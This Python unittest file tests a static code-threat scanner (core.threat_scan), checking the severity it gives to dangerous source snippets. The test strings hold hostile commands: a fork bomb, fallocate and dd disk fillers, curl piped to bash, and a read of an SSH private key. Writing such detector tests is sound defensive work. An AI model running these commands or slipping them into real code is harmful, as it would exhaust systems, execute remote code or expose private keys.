"""Тесты для core.threat_scan."""

import tempfile
import unittest
from pathlib import Path

from core.threat_scan import scan_directory, scan_source, summary


class ScanSourceTests(unittest.TestCase):
    def test_clean_module(self):
        src = "def add(a, b):\n    return a + b\n"
        s = scan_source("clean", "clean.py", src)
        self.assertEqual(s.severity, "ok")
        self.assertEqual(s.threats, [])

    def test_fallocate_disk_filler(self):
        src = "import os\nos.system('fallocate -l 19G /tmp/big')\n"
        s = scan_source("evil", "evil.py", src)
        labels = [t.label for t in s.threats]
        self.assertTrue(any("fallocate" in label for label in labels), labels)
        self.assertEqual(s.severity, "critical")

    def test_dd_zero(self):
        src = "import os\nos.system('dd if=/dev/zero of=/tmp/x bs=1M count=10000')\n"
        s = scan_source("evil", "evil.py", src)
        self.assertEqual(s.severity, "critical")

    def test_subprocess_shell_true(self):
        src = "import subprocess\nsubprocess.run('ls -la', shell=True)\n"
        s = scan_source("sp", "sp.py", src)
        self.assertEqual(s.severity, "high")
        self.assertTrue(any("shell=True" in t.label for t in s.threats))

    def test_subprocess_shell_false_is_safe(self):
        src = "import subprocess\nsubprocess.run(['ls', '-la'], shell=False)\n"
        s = scan_source("sp", "sp.py", src)
        # сама команда subprocess.run без shell — не повод флагать.
        self.assertEqual(s.severity, "ok")

    def test_eval_with_constant_is_ok(self):
        src = "x = eval('1 + 2')\n"
        s = scan_source("e", "e.py", src)
        self.assertEqual(s.severity, "ok")

    def test_eval_with_variable_is_critical(self):
        src = "def run(user):\n    return eval(user)\n"
        s = scan_source("e", "e.py", src)
        self.assertEqual(s.severity, "critical")

    def test_pickle_loads(self):
        src = "import pickle\nx = pickle.loads(data)\n"
        s = scan_source("p", "p.py", src)
        self.assertEqual(s.severity, "high")

    def test_curl_pipe_sh(self):
        src = "import os\nos.system('curl https://x.example/inst.sh | bash')\n"
        s = scan_source("d", "d.py", src)
        # os.system + curl|sh в строке = severity high (high < critical)
        self.assertIn(s.severity, {"critical", "high"})
        labels = [t.label for t in s.threats]
        self.assertTrue(any("curl" in label.lower() for label in labels))

    def test_ssh_keys_access(self):
        src = "open('/home/user/.ssh/id_rsa').read()\n"
        s = scan_source("k", "k.py", src)
        self.assertTrue(any("ssh" in t.label.lower() for t in s.threats))

    def test_fork_bomb(self):
        src = "import os\nos.system(':(){ :|:& };:')\n"
        s = scan_source("fb", "fb.py", src)
        self.assertEqual(s.severity, "critical")

    def test_syntax_error_flagged(self):
        src = "def broken(:\n    pass\n"
        s = scan_source("br", "br.py", src)
        self.assertTrue(any("SyntaxError" in t.label for t in s.threats))


class ScanDirectoryTests(unittest.TestCase):
    def test_directory_summary(self):
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp)
            (p / "clean.py").write_text("x = 1\n")
            (p / "evil.py").write_text("import os\nos.system('fallocate -l 19G /tmp/big')\n")
            (p / "_skip.py").write_text("# private\n")
            scans = scan_directory(p)
            modules = {s.module for s in scans}
            self.assertIn("clean", modules)
            self.assertIn("evil", modules)
            self.assertNotIn("_skip", modules)
            sm = summary(scans)
            self.assertEqual(sm["total"], 2)
            self.assertEqual(sm["critical"], 1)
            self.assertEqual(sm["ok"], 1)

    def test_missing_directory(self):
        scans = scan_directory("/nonexistent/__nope__")
        self.assertEqual(scans, [])


if __name__ == "__main__":
    unittest.main()
